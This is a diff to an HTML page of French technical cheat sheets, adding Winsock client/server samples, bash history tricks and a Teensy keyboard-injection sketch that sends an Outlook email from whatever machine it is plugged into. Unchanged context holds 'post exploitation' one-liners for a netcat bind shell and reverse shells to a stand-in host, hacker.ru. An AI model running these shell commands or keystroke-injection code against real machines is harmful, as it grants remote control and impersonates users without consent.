@@ -5,7 +5,7 @@
   <meta http-equiv="Content-Style-Type" content="text/css" />
   <meta name="generator" content="pandoc" />
   <meta name="author" content="Poulpy, Plopi42" />
-  <meta name="date" content="2012-11-06" />
+  <meta name="date" content="2013-04-25" />
   <title>Technical cheat sheets</title>
   <style type="text/css">
 table.sourceCode, tr.sourceCode, td.lineNumbers, td.sourceCode {
@@ -33,7 +33,7 @@ code > span.er { font-weight: bold; }
 <div id="header">
 <h1 class="title">Technical cheat sheets</h1>
 <h2 class="author">Poulpy, Plopi42</h2>
-<h3 class="date">2012-11-06</h3>
+<h3 class="date">2013-04-25</h3>
 </div>
 <div id="TOC">
 <ul>
@@ -59,6 +59,11 @@ code > span.er { font-weight: bold; }
 <li><a href="#client">Client</a></li>
 <li><a href="#serveur">Serveur</a></li>
 </ul></li>
+<li><a href="#windows-sockets.txt">.#windows-sockets.txt</a></li>
+<li><a href="#socket-windows-en-c-c-1">Socket Windows en C / C++</a><ul>
+<li><a href="#client-1">Client</a></li>
+<li><a href="#serveur-1">Serveur</a></li>
+</ul></li>
 </ul></li>
 </ul></li>
 <li><a href="#linux">Linux</a><ul>
@@ -67,11 +72,15 @@ code > span.er { font-weight: bold; }
 <li><a href="#utilisation">Utilisation</a></li>
 <li><a href="#instalation">Instalation</a></li>
 </ul></li>
+<li><a href="#bash-tricks">Bash tricks</a></li>
 </ul></li>
 <li><a href="#commandes-linux-post-exploitation">Commandes Linux post exploitation</a><ul>
 <li><a href="#création-dun-bindshell">Création d’un bindshell</a></li>
 <li><a href="#création-dun-reverse-bindshell">Création d’un reverse bindshell</a></li>
 </ul></li>
+</ul></li>
+<li><a href="#teensy">Teensy</a><ul>
+<li><a href="#envoie-de-mail-via-outlook-2007">Envoie de mail via outlook 2007</a></li>
 </ul></li>
 <li><a href="#tools">Tools</a><ul>
 <li><a href="#git">GIT</a><ul>
@@ -445,6 +454,274 @@ QUJDQQ==</code></pre>
 
     <span class="kw">return</span> <span class="dv">0</span>;
 }</code></pre>
+<h3 id="windows-sockets.txt"><a href="#TOC">.#windows-sockets.txt</a></h3>
+<h3 id="socket-windows-en-c-c-1"><a href="#TOC">Socket Windows en C / C++</a></h3>
+<h4 id="client-1"><a href="#TOC">Client</a></h4>
+<pre class="sourceCode C"><code class="sourceCode c"><span class="ot">#define WIN32_LEAN_AND_MEAN</span>
+
+<span class="ot">#include &lt;windows.h&gt;</span>
+<span class="ot">#include &lt;winsock2.h&gt;</span>
+<span class="ot">#include &lt;ws2tcpip.h&gt;</span>
+<span class="ot">#include &lt;stdlib.h&gt;</span>
+<span class="ot">#include &lt;stdio.h&gt;</span>
+
+
+<span class="co">// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib</span>
+<span class="ot">#pragma comment (lib, &quot;Ws2_32.lib&quot;)</span>
+<span class="ot">#pragma comment (lib, &quot;Mswsock.lib&quot;)</span>
+<span class="ot">#pragma comment (lib, &quot;AdvApi32.lib&quot;)</span>
+
+
+<span class="ot">#define DEFAULT_BUFLEN 512</span>
+<span class="ot">#define DEFAULT_PORT &quot;27015&quot;</span>
+
+<span class="dt">int</span> __cdecl main(<span class="dt">int</span> argc, <span class="dt">char</span> **argv) 
+{
+    WSADATA wsaData;
+    SOCKET ConnectSocket = INVALID_SOCKET;
+    <span class="kw">struct</span> addrinfo *result = NULL,
+                    *ptr = NULL,
+                    hints;
+    <span class="dt">char</span> *sendbuf = <span class="st">&quot;this is a test&quot;</span>;
+    <span class="dt">char</span> recvbuf[DEFAULT_BUFLEN];
+    <span class="dt">int</span> iResult;
+    <span class="dt">int</span> recvbuflen = DEFAULT_BUFLEN;
+
+    <span class="co">// Validate the parameters</span>
+    <span class="kw">if</span> (argc != <span class="dv">2</span>) {
+        printf(<span class="st">&quot;usage: %s server-name</span><span class="ch">\n</span><span class="st">&quot;</span>, argv[<span class="dv">0</span>]);
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Initialize Winsock</span>
+    iResult = WSAStartup(MAKEWORD(<span class="dv">2</span>,<span class="dv">2</span>), &amp;wsaData);
+    <span class="kw">if</span> (iResult != <span class="dv">0</span>) {
+        printf(<span class="st">&quot;WSAStartup failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    ZeroMemory( &amp;hints, <span class="kw">sizeof</span>(hints) );
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    <span class="co">// Resolve the server address and port</span>
+    iResult = getaddrinfo(argv[<span class="dv">1</span>], DEFAULT_PORT, &amp;hints, &amp;result);
+    <span class="kw">if</span> ( iResult != <span class="dv">0</span> ) {
+        printf(<span class="st">&quot;getaddrinfo failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Attempt to connect to an address until one succeeds</span>
+    <span class="kw">for</span>(ptr=result; ptr != NULL ;ptr=ptr-&gt;ai_next) {
+
+        <span class="co">// Create a SOCKET for connecting to server</span>
+        ConnectSocket = socket(ptr-&gt;ai_family, ptr-&gt;ai_socktype, 
+            ptr-&gt;ai_protocol);
+        <span class="kw">if</span> (ConnectSocket == INVALID_SOCKET) {
+            printf(<span class="st">&quot;socket failed with error: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+            WSACleanup();
+            <span class="kw">return</span> <span class="dv">1</span>;
+        }
+
+        <span class="co">// Connect to server.</span>
+        iResult = connect( ConnectSocket, ptr-&gt;ai_addr, (<span class="dt">int</span>)ptr-&gt;ai_addrlen);
+        <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+            closesocket(ConnectSocket);
+            ConnectSocket = INVALID_SOCKET;
+            <span class="kw">continue</span>;
+        }
+        <span class="kw">break</span>;
+    }
+
+    freeaddrinfo(result);
+
+    <span class="kw">if</span> (ConnectSocket == INVALID_SOCKET) {
+        printf(<span class="st">&quot;Unable to connect to server!</span><span class="ch">\n</span><span class="st">&quot;</span>);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Send an initial buffer</span>
+    iResult = send( ConnectSocket, sendbuf, (<span class="dt">int</span>)strlen(sendbuf), <span class="dv">0</span> );
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;send failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ConnectSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    printf(<span class="st">&quot;Bytes Sent: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+
+    <span class="co">// shutdown the connection since no more data will be sent</span>
+    iResult = shutdown(ConnectSocket, SD_SEND);
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;shutdown failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ConnectSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Receive until the peer closes the connection</span>
+    <span class="kw">do</span> {
+
+        iResult = recv(ConnectSocket, recvbuf, recvbuflen, <span class="dv">0</span>);
+        <span class="kw">if</span> ( iResult &gt; <span class="dv">0</span> )
+            printf(<span class="st">&quot;Bytes received: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        <span class="kw">else</span> <span class="kw">if</span> ( iResult == <span class="dv">0</span> )
+            printf(<span class="st">&quot;Connection closed</span><span class="ch">\n</span><span class="st">&quot;</span>);
+        <span class="kw">else</span>
+            printf(<span class="st">&quot;recv failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+
+    } <span class="kw">while</span>( iResult &gt; <span class="dv">0</span> );
+
+    <span class="co">// cleanup</span>
+    closesocket(ConnectSocket);
+    WSACleanup();
+
+    <span class="kw">return</span> <span class="dv">0</span>;
+}</code></pre>
+<h4 id="serveur-1"><a href="#TOC">Serveur</a></h4>
+<pre class="sourceCode C"><code class="sourceCode c">
+<span class="ot">#define WIN32_LEAN_AND_MEAN</span>
+
+<span class="ot">#undef UNICODE</span>
+
+
+<span class="ot">#include &lt;windows.h&gt;</span>
+<span class="ot">#include &lt;winsock2.h&gt;</span>
+<span class="ot">#include &lt;ws2tcpip.h&gt;</span>
+<span class="ot">#include &lt;stdlib.h&gt;</span>
+<span class="ot">#include &lt;stdio.h&gt;</span>
+
+<span class="co">// Need to link with Ws2_32.lib</span>
+<span class="ot">#pragma comment (lib, &quot;Ws2_32.lib&quot;)</span>
+<span class="co">// #pragma comment (lib, &quot;Mswsock.lib&quot;)</span>
+
+<span class="ot">#define DEFAULT_BUFLEN 512</span>
+<span class="ot">#define DEFAULT_PORT &quot;27015&quot;</span>
+
+<span class="dt">int</span> __cdecl main(<span class="dt">void</span>) 
+{
+    WSADATA wsaData;
+    <span class="dt">int</span> iResult;
+
+    SOCKET ListenSocket = INVALID_SOCKET;
+    SOCKET ClientSocket = INVALID_SOCKET;
+
+    <span class="kw">struct</span> addrinfo *result = NULL;
+    <span class="kw">struct</span> addrinfo hints;
+
+    <span class="dt">int</span> iSendResult;
+    <span class="dt">char</span> recvbuf[DEFAULT_BUFLEN];
+    <span class="dt">int</span> recvbuflen = DEFAULT_BUFLEN;
+
+    <span class="co">// Initialize Winsock</span>
+    iResult = WSAStartup(MAKEWORD(<span class="dv">2</span>,<span class="dv">2</span>), &amp;wsaData);
+    <span class="kw">if</span> (iResult != <span class="dv">0</span>) {
+        printf(<span class="st">&quot;WSAStartup failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    ZeroMemory(&amp;hints, <span class="kw">sizeof</span>(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    hints.ai_flags = AI_PASSIVE;
+
+    <span class="co">// Resolve the server address and port</span>
+    iResult = getaddrinfo(NULL, DEFAULT_PORT, &amp;hints, &amp;result);
+    <span class="kw">if</span> ( iResult != <span class="dv">0</span> ) {
+        printf(<span class="st">&quot;getaddrinfo failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Create a SOCKET for connecting to server</span>
+    ListenSocket = socket(result-&gt;ai_family, result-&gt;ai_socktype, result-&gt;ai_protocol);
+    <span class="kw">if</span> (ListenSocket == INVALID_SOCKET) {
+        printf(<span class="st">&quot;socket failed with error: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        freeaddrinfo(result);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Setup the TCP listening socket</span>
+    iResult = bind( ListenSocket, result-&gt;ai_addr, (<span class="dt">int</span>)result-&gt;ai_addrlen);
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;bind failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        freeaddrinfo(result);
+        closesocket(ListenSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    freeaddrinfo(result);
+
+    iResult = listen(ListenSocket, SOMAXCONN);
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;listen failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ListenSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// Accept a client socket</span>
+    ClientSocket = accept(ListenSocket, NULL, NULL);
+    <span class="kw">if</span> (ClientSocket == INVALID_SOCKET) {
+        printf(<span class="st">&quot;accept failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ListenSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// No longer need server socket</span>
+    closesocket(ListenSocket);
+
+    <span class="co">// Receive until the peer shuts down the connection</span>
+    <span class="kw">do</span> {
+
+        iResult = recv(ClientSocket, recvbuf, recvbuflen, <span class="dv">0</span>);
+        <span class="kw">if</span> (iResult &gt; <span class="dv">0</span>) {
+            printf(<span class="st">&quot;Bytes received: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+
+        <span class="co">// Echo the buffer back to the sender</span>
+            iSendResult = send( ClientSocket, recvbuf, iResult, <span class="dv">0</span> );
+            <span class="kw">if</span> (iSendResult == SOCKET_ERROR) {
+                printf(<span class="st">&quot;send failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+                closesocket(ClientSocket);
+                WSACleanup();
+                <span class="kw">return</span> <span class="dv">1</span>;
+            }
+            printf(<span class="st">&quot;Bytes sent: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iSendResult);
+        }
+        <span class="kw">else</span> <span class="kw">if</span> (iResult == <span class="dv">0</span>)
+            printf(<span class="st">&quot;Connection closing...</span><span class="ch">\n</span><span class="st">&quot;</span>);
+        <span class="kw">else</span>  {
+            printf(<span class="st">&quot;recv failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+            closesocket(ClientSocket);
+            WSACleanup();
+            <span class="kw">return</span> <span class="dv">1</span>;
+        }
+
+    } <span class="kw">while</span> (iResult &gt; <span class="dv">0</span>);
+
+    <span class="co">// shutdown the connection since we&#39;re done</span>
+    iResult = shutdown(ClientSocket, SD_SEND);
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;shutdown failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ClientSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// cleanup</span>
+    closesocket(ClientSocket);
+    WSACleanup();
+
+    <span class="kw">return</span> <span class="dv">0</span>;
+}</code></pre>
 <h1 id="linux"><a href="#TOC">Linux</a></h1>
 <h2 id="linux-utils"><a href="#TOC">Linux utils</a></h2>
 <h3 id="affichage-de-ladresse-ip"><a href="#TOC">Affichage de l’adresse IP</a></h3>
@@ -452,6 +729,38 @@ QUJDQQ==</code></pre>
 <pre><code>ifdata -pa eth0</code></pre>
 <h4 id="instalation"><a href="#TOC">Instalation</a></h4>
 <pre><code>apt-get install moreutils</code></pre>
+<h3 id="bash-tricks"><a href="#TOC">Bash tricks</a></h3>
+<p>The following tricks use the bash history.</p>
+<pre><code>$ echo toto
+toto
+
+$ echo !$
+echo toto
+toto</code></pre>
+<pre><code>$ echo toto titi
+toto titi
+
+$ echo !-1:1
+echo toto
+toto</code></pre>
+<pre><code>$ echo tata toto titi
+tata toto titi
+
+$ echo toto titi
+toto titi
+
+$ echo !-2:2
+echo toto
+toto</code></pre>
+<pre><code>$ echo tata toto titi
+tata toto titi
+
+$ echo toto titi
+toto titi
+
+$ echo !-2:1
+echo tata
+tata</code></pre>
 <h2 id="commandes-linux-post-exploitation"><a href="#TOC">Commandes Linux post exploitation</a></h2>
 <h3 id="création-dun-bindshell"><a href="#TOC">Création d’un bindshell</a></h3>
 <pre><code>nc -e /bin/bash -lp 8080</code></pre>
@@ -461,6 +770,92 @@ QUJDQQ==</code></pre>
 <pre><code>/bin/bash &lt; /dev/tcp/hacker.ru/80 1&gt;&amp;0</code></pre>
 <p>Si netcat est présent :</p>
 <pre><code>nc -e /bin/bash hacker.ru 80</code></pre>
+<h1 id="teensy"><a href="#TOC">Teensy</a></h1>
+<h3 id="envoie-de-mail-via-outlook-2007"><a href="#TOC">Envoie de mail via outlook 2007</a></h3>
+<pre class="sourceCode C"><code class="sourceCode c"><span class="dt">const</span> <span class="dt">int</span> ledPin = <span class="dv">13</span>;
+<span class="dt">int</span> doit = <span class="dv">0</span>;
+
+<span class="dt">void</span> pressKeyWithModifier(<span class="dt">uint8_t</span> modifier, <span class="dt">uint8_t</span> key)
+{
+  Keyboard.set_modifier(modifier);
+  Keyboard.set_key1(key);
+  Keyboard.send_now();
+  delay(<span class="dv">45</span>);
+
+  Keyboard.set_modifier(<span class="dv">0</span>);
+  Keyboard.set_key1(<span class="dv">0</span>);
+  Keyboard.send_now();
+  delay(<span class="dv">45</span>);
+}
+
+<span class="dt">void</span> launchCmd(<span class="dt">const</span> <span class="dt">char</span>* cmd)
+{
+  pressKeyWithModifier(MODIFIERKEY_GUI, KEY_R);
+  Keyboard.println(cmd);
+}
+
+<span class="dt">void</span> waitAndBlink(<span class="dt">int</span> waitTime, <span class="dt">int</span> blinkDelay)
+{
+  delay(waitTime);
+  digitalWrite(ledPin, LOW);
+  delay(blinkDelay);
+  digitalWrite(ledPin, HIGH);
+}
+
+<span class="dt">void</span> setup()
+{
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, HIGH);
+
+  doit = <span class="dv">0</span>;
+}
+
+<span class="dt">void</span> writeMail(<span class="dt">const</span> <span class="dt">char</span>* to, <span class="dt">const</span> <span class="dt">char</span>* subject, <span class="dt">const</span> <span class="dt">char</span>* content, <span class="dt">const</span> <span class="dt">char</span>* sign)
+{
+  waitAndBlink(<span class="dv">200</span>, <span class="dv">200</span>);
+
+  pressKeyWithModifier(MODIFIERKEY_GUI, KEY_R);
+  waitAndBlink(<span class="dv">200</span>, <span class="dv">200</span>);
+  Keyboard.print(<span class="st">&quot;mailto:&quot;</span>);
+  Keyboard.print(to);
+  Keyboard.print(<span class="st">&quot;?subject=&quot;</span>);
+  Keyboard.print(subject);
+  Keyboard.print(<span class="st">&quot;&amp;body=&quot;</span>);
+  Keyboard.print(content);
+  Keyboard.print(<span class="st">&quot;%0A%0A--%20%0A&quot;</span>);
+  Keyboard.print(sign);
+  Keyboard.println(<span class="st">&quot;&quot;</span>);
+
+  waitAndBlink(<span class="dv">1000</span>, <span class="dv">200</span>);
+  <span class="co">//Send</span>
+  pressKeyWithModifier(MODIFIERKEY_ALT, KEY_V);
+  waitAndBlink(<span class="dv">200</span>, <span class="dv">200</span>);
+}
+
+<span class="dt">void</span> loop()
+{
+  <span class="dt">char</span> *to;
+  delay(<span class="dv">1900</span>);
+
+  <span class="kw">if</span> (!doit)
+  {
+    to = <span class="st">&quot;tata@yopmail.com&quot;</span>;
+  }
+  <span class="kw">else</span>
+  {
+    to = <span class="st">&quot;toto@yopmail.com&quot;</span>;
+  }
+
+  writeMail(to, <span class="st">&quot;Croissants mardi&quot;</span>,
+                <span class="st">&quot;Bonjour,%0A%0AJ&#39;offre%20à%20toute%20l&#39;équipe%20des%20croissants%20et%20des%20pains%20au%20chocolat%20mardi%20matin.&quot;</span>,
+                <span class="st">&quot;Teensy%20by%20Me&quot;</span>);
+
+  digitalWrite(ledPin, HIGH);
+  delay(<span class="dv">500</span>);
+  digitalWrite(ledPin, LOW);
+  delay(<span class="dv">20000</span>);
+
+}</code></pre>
 <h1 id="tools"><a href="#TOC">Tools</a></h1>
 <h2 id="git"><a href="#TOC">GIT</a></h2>
 <h3 id="ressources"><a href="#TOC">Ressources</a></h3>
